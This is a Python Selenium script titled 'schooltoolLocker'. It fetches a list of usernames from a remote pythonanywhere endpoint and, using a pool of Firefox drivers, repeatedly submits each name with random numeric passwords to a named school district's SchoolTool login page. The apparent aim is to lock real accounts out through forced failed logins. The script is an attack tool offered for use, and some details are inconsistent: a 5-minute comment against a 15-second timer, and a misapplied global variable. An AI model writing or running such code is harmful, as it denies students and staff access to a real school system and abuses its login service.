import time, threading,json,string,random, requests,sys
from selenium import webdriver
from selenium.webdriver.common.by import By
# Updates the data every 5 minutes
def schooltoolLocker(stop_flag):
    currentData = None
    def task():
        global currentData
        currentData = getData()


    def getData():
        try:
            url = 'http://randomurl.pythonanywhere.com/schooltooldata'
            x = requests.post(url)
            return x.text
        except Exception as e:
            return None

    def minute_timer():
        try:
            while True:
                task()
                time.sleep(15)
        except Exception as e:
            None
    try:
        thread = threading.Thread(target=minute_timer)
        thread.daemon = True
        thread.start()
    except Exception:
        None
        
    def create_driver():
        try:
            w = webdriver.Firefox()
            w.get('https://www2.schooltool.com/Queensbury/Default.aspx')
            return w
        except Exception as e:
            None
    driver_pool = [create_driver() for _ in range(5)] 

    def get_available_driver():
        try:
            for driver in driver_pool:
                if not getattr(driver, 'in_use', False):
                    driver.in_use = True
                    return driver
            return None
        except Exception as e:
            None
    def release_driver(driver):
        try:
            driver.in_use = False
        except Exception as e:
            None
    def process_key_value(key, value):
        try:
            driver = get_available_driver()
            if driver:
                ele = driver.find_element(By.ID, "floatingInput")
                ele2 = driver.find_element(By.ID, "floatingPassword")
                ele3 = driver.find_element(By.CSS_SELECTOR, ".btn.btn-lg.btn-primary")
                ele.send_keys(key)
                ele2.send_keys(''.join(random.choices(string.digits, k=random.randint(5,10))))
                ele3.click()
                release_driver(driver)
            else:
                print("No available WebDriver instances. Waiting...")
        except Exception as e:
            print(e)

    while True:
        try:
            if stop_flag.is_set():
                break

            if currentData is not None:
                python_dict = json.loads(currentData)
                threads = []
                for key, value in python_dict.items():
                    thread = threading.Thread(target=process_key_value, args=(key, value))
                    thread.start()
                    threads.append(thread)
                for thread in threads:
                    thread.join()
            time.sleep(0.5)
        except Exception as e:
            print(e)
            
    for driver in driver_pool:
        driver.quit()